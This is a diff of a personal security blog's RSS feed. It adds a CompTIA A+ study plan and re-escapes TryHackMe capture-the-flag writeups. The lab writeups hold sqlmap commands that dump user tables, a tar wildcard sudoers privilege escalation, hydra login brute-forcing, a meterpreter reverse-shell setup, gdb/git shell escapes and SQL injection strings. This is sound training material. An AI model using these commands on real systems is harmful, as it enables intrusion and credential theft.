@@ -12,6 +12,33 @@
     </author>
     
       <item>
+        <title>CompTIA A+ Study Plan</title>
+        <description>&lt;h1 id=&quot;comptia-a-plan&quot;&gt;CompTIA A+ Plan&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;change-of-plans&quot;&gt;Change of Plans&lt;/h2&gt;
+
+&lt;p&gt;When I originally started this blog, it was to hold CTF writeups as a way of tracking my progress toward the OSCP. While I still hold the long term goal of getting the OSCP, and still want to post CTF writeups, I’ve decided to go after some easier/more marketable certifications along the way. I’ve scheduled both the CompTIA A+ 220-1001 and 220-1002 exams for May 29th. I started studying daily for the exams March 1st. I think three months is a good amount of time for the material that I need to cover.&lt;/p&gt;
+
+&lt;h2 id=&quot;study-plan&quot;&gt;Study Plan&lt;/h2&gt;
+
+&lt;p&gt;I’m a big fan of having multiple sources to study so I have a book, a lecture series, and practice questions. The book I bought is Mike Meyer’s all-in-one CompTIA A+ exam guide. Admittedly I bought a slightly older version because it was significantly cheaper. The biggest updates to the exam from the version my book covers has to do with Microsoft Windows topics. I’ll have to be more thorough on those topics in general since I haven’t really daily driven Windows in a while (I was on MacOS all through college and have been using Linux for the past year and a half, I’m all about that unix OS life).&lt;/p&gt;
+
+&lt;p&gt;In addition the book, I bought Professor Messer’s success bundle that includes: lectures, notes, practice tests, mp3s, and some exam tips. I’ve been listening to the lectures while at work for the past week or so and plan on continuing to do so as well as actually watching them to see things like connector types and the like.&lt;/p&gt;
+
+&lt;p&gt;I also bought a CompTIA A+ study app for my phone that I use throughout the day. It seems to be good for testing how much of a given topic I understand, not so much for learning the material. Either way I have a pretty good idea of what I need to study for the last month before my exam.&lt;/p&gt;
+
+&lt;p&gt;In regards to the 1001 exam, I consistently score well with the virtualization and cloud computing section as well as mobile devices. Networking seems to be hit or miss as well as hardware. My biggest challenge is hardware and network troubleshooting. I think part of my problem is the specifics of networking like “What Ethernet specification do you need to run a connection of 10Gbps over 5km?”. It’s the nitty gritty of specific cables, connections, and things like that. I have a good high level understanding, now comes the grind of learning exactly what cables and connections are needed. I also have a hard time with printers too. I think that’s the biggest hurdle for me when it comes to the hardware section.&lt;/p&gt;
+
+&lt;p&gt;The 1002 exam is interesting. I seem to have the same level of understanding when it comes to OS, security, and operational procedures, but software troubleshooting is a pain point for me. I think part of that stems from my lack of Windows understanding. That’s going to be a big study point for me in this final stretch of time before the exam.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 01 May 2021 00:00:00 -0500</pubDate>
+        <link>http://localhost:8000//CompTIA_A+_Plan</link>
+        <link href="http://localhost:8000/CompTIA_A+_Plan"/>
+        <guid isPermaLink="true">http://localhost:8000/CompTIA_A+_Plan</guid>
+      </item>
+    
+      <item>
         <title>Startup Writeup</title>
         <description>&lt;h1 id=&quot;tryhackme---startup&quot;&gt;TryHackMe - Startup&lt;/h1&gt;
 &lt;hr /&gt;
@@ -480,7 +507,7 @@ Database: joomla
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' --columns
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T &apos;#__users&apos; --columns
 
 Database: joomla
 Table: #__users
@@ -502,7 +529,7 @@ Table: #__users
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.100.104/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' -C 'username, email, password, id' --dump&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.100.104/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T &apos;#__users&apos; -C &apos;username, email, password, id&apos; --dump&lt;/code&gt;
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
@@ -548,7 +575,7 @@ Database: joomla
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' --columns
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://&amp;lt;machine-ip&amp;gt;/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T &apos;#__users&apos; --columns
 
 Database: joomla
 Table: #__users
@@ -570,7 +597,7 @@ Table: #__users
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.100.104/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T '#__users' -C 'username, email, password, id' --dump&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap -u &quot;http://10.10.100.104/index.php?option=com_fields&amp;amp;view=fields&amp;amp;layout=modal&amp;amp;list[fullordering]=updatexml&quot; -D joomla -T &apos;#__users&apos; -C &apos;username, email, password, id&apos; --dump&lt;/code&gt;
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
@@ -824,7 +851,7 @@ by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo 'echo &quot;www-data ALL=(root) NOPASSWD: ALL&quot; &amp;gt; /etc/sudoers' &amp;gt; privesc.sh
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &apos;echo &quot;www-data ALL=(root) NOPASSWD: ALL&quot; &amp;gt; /etc/sudoers&apos; &amp;gt; privesc.sh
 echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh privesc.sh&quot;
 echo &quot;&quot; &amp;gt; --checkpoint=1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -897,7 +924,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds
 
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT * FROM users WHERE username = :username AND password := password&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;This kind of information is invaluable. After a brief example of theoretical SQLi. It tells us to enter the username and password fields as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1 -- -&lt;/code&gt;. This tricks the database into giving us access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portal.php&lt;/code&gt; page. The next task has us using a  well-known tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt;. The first step is to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt; to intercept the POST request to the search feature of the website. Next we copy the request to a file and save it in order to run it through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt;. Below is a picture of the http request, followed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt; command that I ran.
+&lt;p&gt;This kind of information is invaluable. After a brief example of theoretical SQLi. It tells us to enter the username and password fields as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; or 1=1 -- -&lt;/code&gt;. This tricks the database into giving us access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portal.php&lt;/code&gt; page. The next task has us using a  well-known tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt;. The first step is to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BurpSuite&lt;/code&gt; to intercept the POST request to the search feature of the website. Next we copy the request to a file and save it in order to run it through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt;. Below is a picture of the http request, followed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLMap&lt;/code&gt; command that I ran.
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
@@ -1073,20 +1100,20 @@ Progress: 124708 / 220561 (56.54%)^C
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;
-hydra -l &amp;lt;username&amp;gt; -p &amp;lt;password list&amp;gt; &amp;lt;IP Address&amp;gt; http-form-post &amp;lt;login page:request headers:failed login message&amp;gt;
-&lt;/code&gt;
+&lt;p&gt;`
+hydra -l &lt;username&gt; -p &lt;password list=&quot;&quot;&gt; &lt;IP Address=&quot;&quot;&gt; http-form-post &lt;login page:request=&quot;&quot; headers:failed=&quot;&quot; login=&quot;&quot; message=&quot;&quot;&gt;
+`
 &lt;br /&gt;
 &lt;br /&gt;
-As I said before I’ll be using the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and the password list rockyou.txt. The parameters can be found a few ways, but the easiest is in burp suite. Type in any username and password, then look at where the POST request is getting sent to, in our case, it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Account/login.aspx&lt;/code&gt;. We’ll type that into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login page&lt;/code&gt; of our command. Then find the headers by looking at the bottom of the request where it starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__VIEWSTATE...&lt;/code&gt; and replace your username with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^USER^&lt;/code&gt; and password with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PASS&lt;/code&gt;, then copy and paste that into the command as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request headers&lt;/code&gt;. Finally send the request through and see that the failed login says &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login failed&lt;/code&gt; and type that into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;failed login message&lt;/code&gt;. The BurpSuite window you need and the end result should look something like this:
+As I said before I&apos;ll be using the username `admin` and the password list rockyou.txt. The parameters can be found a few ways, but the easiest is in burp suite. Type in any username and password, then look at where the POST request is getting sent to, in our case, it&apos;s `/Account/login.aspx`. We&apos;ll type that into the `login page` of our command. Then find the headers by looking at the bottom of the request where it starts with `__VIEWSTATE...` and replace your username with `^USER^` and password with `PASS`, then copy and paste that into the command as the `request headers`. Finally send the request through and see that the failed login says `Login failed` and type that into the `failed login message`. The BurpSuite window you need and the end result should look something like this:
 &lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
+&lt;br /&gt;&lt;/login&gt;&lt;/IP&gt;&lt;/password&gt;&lt;/username&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;assets/images/hackpark/hackpark_hydra.png&quot; alt=&quot;BurpSuite Request Image&quot; /&gt;
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.99.227 http-form-post '/Account/login.aspx:__VIEWSTATE=Yz2BmKWWmXED1M056DNvSQhT62lTMsJhye52KUnzi5j%2FYknWsMsDcNTgSNiRIP2D0%2Bc5vRnv5V%2BJjLsayVDwL%2FGipfl%2FYYKH9z5aG6v7oPhjdXPFV%2F1TPaFuzULQdV7VKi%2FQ2whj3p5jjcsl0naPMgEzObayz4u6g%2B09OsJe3mU7EaMUwhOL0zl7clQ5odf5BLU6hvYwWyLOTvieZ%2BbgWMfjXaxZa75LXWImGmWDdtx5GsbWohL7CAkW5%2B%2Bb2y%2BZzr%2F9OlBObL7ZFPuzNZ%2FMdB18F4ddVhgppKkgvAKRc4OjIdcNdJ8JYICw0H58CV2J8oNn3xlz6PiXnSDDRRQnwWGcUubFx6yaezYKmkB8McM1s7IG&amp;amp;__EVENTVALIDATION=%2FQ1jgWYDvNlzWDYKERdr1OFYc%2FdP88fNJliWRB6G56lCwhimMmZ%2Bm629vWFW8m1FXpiyykZyzK1hCR3k7QwTE00bvmdzREUCtVMF6kHqC10GEbK2BLBoH4ckTVI4VoLWV%2F7FOt2QmdJL6t%2BdVb3DJpdRPLybAcJN1dMzqpj7zMZRylt%2B&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.99.227 http-form-post &apos;/Account/login.aspx:__VIEWSTATE=Yz2BmKWWmXED1M056DNvSQhT62lTMsJhye52KUnzi5j%2FYknWsMsDcNTgSNiRIP2D0%2Bc5vRnv5V%2BJjLsayVDwL%2FGipfl%2FYYKH9z5aG6v7oPhjdXPFV%2F1TPaFuzULQdV7VKi%2FQ2whj3p5jjcsl0naPMgEzObayz4u6g%2B09OsJe3mU7EaMUwhOL0zl7clQ5odf5BLU6hvYwWyLOTvieZ%2BbgWMfjXaxZa75LXWImGmWDdtx5GsbWohL7CAkW5%2B%2Bb2y%2BZzr%2F9OlBObL7ZFPuzNZ%2FMdB18F4ddVhgppKkgvAKRc4OjIdcNdJ8JYICw0H58CV2J8oNn3xlz6PiXnSDDRRQnwWGcUubFx6yaezYKmkB8McM1s7IG&amp;amp;__EVENTVALIDATION=%2FQ1jgWYDvNlzWDYKERdr1OFYc%2FdP88fNJliWRB6G56lCwhimMmZ%2Bm629vWFW8m1FXpiyykZyzK1hCR3k7QwTE00bvmdzREUCtVMF6kHqC10GEbK2BLBoH4ckTVI4VoLWV%2F7FOt2QmdJL6t%2BdVb3DJpdRPLybAcJN1dMzqpj7zMZRylt%2B&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&apos;
 Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-21 13:35:45
@@ -1186,7 +1213,7 @@ Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
-   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
+   EXITFUNC  none             yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)
    LHOST     REDACTED    yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
@@ -1466,7 +1493,7 @@ User www-data may run the following commands on ubuntu-xenial:
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb -nx -ex '!sh' -ex quit&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb -nx -ex &apos;!sh&apos; -ex quit&lt;/code&gt;
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
@@ -1474,11 +1501,11 @@ User www-data may run the following commands on ubuntu-xenial:
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit&lt;/code&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -u thirtytwo /var/www/gdb -nx -ex &apos;!sh&apos; -ex quit&lt;/code&gt;
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit        
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -u thirtytwo /var/www/gdb -nx -ex &apos;!sh&apos; -ex quit        
 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
 Copyright (C) 2016 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
@@ -1519,7 +1546,7 @@ Now you can use git. Took a while to fix it but now its good :)
 
 &lt;p&gt;Hmm. This looks similar to the lateral movement we just did. For this escalation to work we first we need to stabilize the shell. My recommended way is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stabilize_shell.sh&lt;/code&gt; script in John Hammond’s repository &lt;a href=&quot;https://github.com/JohnHammond/poor-mans-pentest&quot;&gt;here&lt;/a&gt;, but you can also do so manually following the method &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;here&lt;/a&gt;. Either way, I recommended you check out John Hammond’s youtube channel, it’s been a great resource for me on this OSCP journey.&lt;/p&gt;
 
-&lt;p&gt;After the stabilization, we should do a little more research on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; command on &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFObins&lt;/a&gt;. It turns out we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGER='sh -c &quot;exec sh 0&amp;lt;&amp;amp;1&quot;' sudo -u d4rckh /usr/bin/git -p help&lt;/code&gt; to invoke git with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less&lt;/code&gt; command. From there we can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!/bin/bash&lt;/code&gt; to give us a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d4rckh&lt;/code&gt;.
+&lt;p&gt;After the stabilization, we should do a little more research on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; command on &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFObins&lt;/a&gt;. It turns out we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGER=&apos;sh -c &quot;exec sh 0&amp;lt;&amp;amp;1&quot;&apos; sudo -u d4rckh /usr/bin/git -p help&lt;/code&gt; to invoke git with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;less&lt;/code&gt; command. From there we can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!/bin/bash&lt;/code&gt; to give us a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d4rckh&lt;/code&gt;.
 &lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 
@@ -1571,7 +1598,7 @@ all([&quot;/bin/sh&quot;,&quot;-i&quot;])
       </item>
     
       <item>
-        <title>Gotta Catch'em All! Writeup</title>
+        <title>Gotta Catch&apos;em All! Writeup</title>
         <description>&lt;h1 id=&quot;tryhackme---gotta-catchem-all&quot;&gt;TryHackMe - Gotta Catch’em All!&lt;/h1&gt;
 &lt;hr /&gt;
 
@@ -1666,158 +1693,6 @@ Nmap done: 1 IP address (1 host up) scanned in 152.10 seconds
         <link>http://localhost:8000//Pokemon</link>
         <link href="http://localhost:8000/Pokemon"/>
         <guid isPermaLink="true">http://localhost:8000/Pokemon</guid>
-      </item>
-    
-      <item>
-        <title>OWASP Juice Shop Writeup</title>
-        <description>&lt;h1 id=&quot;tryhackme---juice-shop&quot;&gt;TryHackMe - Juice Shop&lt;/h1&gt;
-&lt;hr /&gt;
-
-&lt;p&gt;This is a writeup of the OWASP Juice Shop room on &lt;a href=&quot;http://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. This room is a well-known web application used to learn the OWASP top ten web application security risks, and actually has much more to offer than just the tasks given to us in TryHackMe. For that reason, I’ll be adding onto this at the end of the writeup (and hopefully revisit it over time) in order to better my web application pen testing skills. After all, web applications are one of the most enticing ways to gain access to networks.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
-
-&lt;p&gt;Because this is a web application, I’m going to skip the scanning part of this room, and head straight to the web app. Here’s the home page:&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_Home.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;The room on THM instructs us to move around the webpage and get a feel for how it works. I’ll list some of the more interesting things I see on initial enumeration. Some of the things I’m looking for are: places that recieve user input, login pages, downloads, etc. Here’s an initial list.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Search bar at the top of the page&lt;/li&gt;
-  &lt;li&gt;Customer Feedback page&lt;/li&gt;
-  &lt;li&gt;Login page&lt;/li&gt;
-  &lt;li&gt;Cookie usage&lt;/li&gt;
-  &lt;li&gt;Recycling box request page&lt;/li&gt;
-  &lt;li&gt;info disclosure under the products, reveals usernames to try to break into&lt;/li&gt;
-  &lt;li&gt;Download on the about us page gives us possible ftp.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;That’s all from the initial messing around which took about ~5-10 minutes. I’m sure that I’ll see more as I dive deeper into the box.&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;injection&quot;&gt;Injection&lt;/h2&gt;
-
-&lt;p&gt;The first task on the webpage is to successfully login to the admin account using SQL injeciton. This particular SQL injection will work by typing malicious input into the login. The web app doesn’t properly sanitize the input, and reads it in such a manner that just lets us waltz right into the admin’s account. The only piece of info we really need, the admin’s email, it can be found in the apple juice product on the homepage. If we click on the product, it gives us the email of whoever has left a review of that product. One has been submitted by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@juice-sh.op&lt;/code&gt; so we can use that email to login.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-  &lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_admin.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;So the final piece of the SQL injection is to add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'--&lt;/code&gt; to the end of the admin’s email and then we will be able to type whatever password we want and gain access to the admin’s account. This is due to the input of the special characters being handled poorly. More specifically, the input is being interpreted by SQL as commenting out the password. We get a green notification at the top of the screen when we successfully login as admin.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_adminlogin.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;broken-authentication&quot;&gt;Broken Authentication&lt;/h2&gt;
-
-&lt;p&gt;The next task is broken authentication. We are given the details of exploiting bugs in the authentication process as well as an insecure forgotten password mechanism. We’ll start with resetting Jim’s password. Again, we can verify jim’s email by looking through the products and seeing that a review for the green smoothie has been left by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jim@juice-sh.op&lt;/code&gt;. His comment is also interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fresh out of a replicator.&lt;/code&gt;. Doing some basic OSINT by googling the word replicator gives us results for Star Trek.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_replicator.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Being a massive nerd, I can guess that Jim is short for James, as in Captain James T. Kirk. At the login page, there is a link for forgotten passwords. clicking on that leads us to the following screen:&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_forgotten.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;We can see that the security question asks for Jim’s eldest brother’s middle name. Now, I may be a nerd, but I’m not &lt;em&gt;that&lt;/em&gt; much of a nerd, so back to google it is. Turns out that Jim’s oldest brother’s name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;George Samuel &quot;Sam&quot; Kirk&lt;/code&gt;. There’s the answer to question 1 in task 5, and we can reset the password to whatever we want. I like this challenge because it shows how a little bit of OSINT can really go a long way. It’s also a bit of a warning to not reveal too much personal info online. Obviously this is an extreme case of an insecure web-app, but still.&lt;/p&gt;
-
-&lt;p&gt;The next question asks us what the administrator’s password is. It also provides the hint that sometimes admins pick common passwords. After trying a few common passwords, I went the easy route and used BurpSuite to brute force the admin account with a basic password list and found that the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_adminpassword.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;sensitive-data-exposure&quot;&gt;Sensitive Data Exposure&lt;/h2&gt;
-
-&lt;p&gt;The next task deals with sensitive data exposure and the only question here is to access a confidential markdown file. From my initial enumeration, I already had a decent idea about how to access some files. At the about us page we can see a link to the term of use. Hovering over it shows the link in a directory called ftp. So if we edit the URL to include the ftp on the end, we can access all the files on the file share in theory.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_ftp.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;broken-access-control&quot;&gt;Broken Access Control&lt;/h2&gt;
-
-&lt;p&gt;The first question has us access the administration section of the page and then asks when the name is. There are several ways to do this. I simply took a shot in the dark and tried &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administration&lt;/code&gt;, and I got in that way. The more technical way, and the way THM hints at, asks you to take a look at the js files. If you take a look in the web developer tools, you’ll find a js file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.js&lt;/code&gt;. Searching for the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; in the file gives us a path called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administration&lt;/code&gt;.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_administration.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Next we have to access someone else’s shopping cart. Currently, I’m still logged in as admin so I’ll head to their shopping cart. Once in the shopping cart, we can take a look at the console again. Going over to the storage section we see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; item. If we change that number, we should be able to look at another cart.
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;assets/images/OWASPJuiceShop/OWASPJuiceShop_cart.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
